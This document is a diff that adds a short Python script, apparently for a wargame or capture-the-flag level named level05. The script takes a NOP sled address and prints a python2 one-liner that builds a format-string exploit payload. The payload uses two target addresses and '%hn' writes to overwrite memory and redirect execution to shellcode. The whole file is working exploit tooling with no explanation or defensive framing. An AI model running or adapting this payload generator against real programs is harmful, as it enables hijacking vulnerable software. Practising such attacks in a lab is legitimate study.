@@ -1,0 +1,15 @@
+#!/usr/bin/env python3
+
+address = int(input("NOP sled address (hex): "), 16)
+low = address & 0xffff
+high = address >> 16
+
+first = (low - 8) % 65536
+if first < 10:
+    first += 65536
+
+second = (high - (8 + first)) % 65536
+if second < 10:
+    second += 65536
+
+print(f'\npython2 -c \'print("\\x08\\x04\\x97\\xe0"[::-1] + "\\x08\\x04\\x97\\xe2"[::-1] + "%{first}d%10$hn%{second}d%11$hn")\' > /tmp/level05')
